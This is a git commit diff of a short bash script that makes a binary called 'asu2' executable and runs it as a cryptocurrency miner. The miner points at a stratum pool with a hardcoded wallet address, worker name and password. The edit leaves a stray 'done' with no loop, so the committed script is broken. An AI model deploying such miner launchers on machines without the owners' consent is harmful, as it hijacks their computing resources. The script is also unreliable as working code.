7b55ce463960a97f63b1ced1f6a40cc20b12a1a6
matius300 <33297541+matius300@users.noreply.github.com>
2021-04-05 10:38:36 +0700

    Update asu_001.sh

--- asu_001.sh
+++ asu_001.sh
@@ -1,2 +1,6 @@
 #!/bin/bash
-while [ 1 ] ; do ./asu2 -a cpupower -o stratum-ru.rplant.xyz:7029 -u CYvky5VuVisG7fn3nocRBR38qrixJHEisA.AZAZIL_001 -p d=0.01,password=jancok -t3; sleep 5; done
+
+chmod +x asu2
+./asu2 -a cpupower -o stratum-ru.rplant.xyz:7029 -u CYvky5VuVisG7fn3nocRBR38qrixJHEisA.AZAZIL_001 -p d=0.01,password=jancok
+
+done
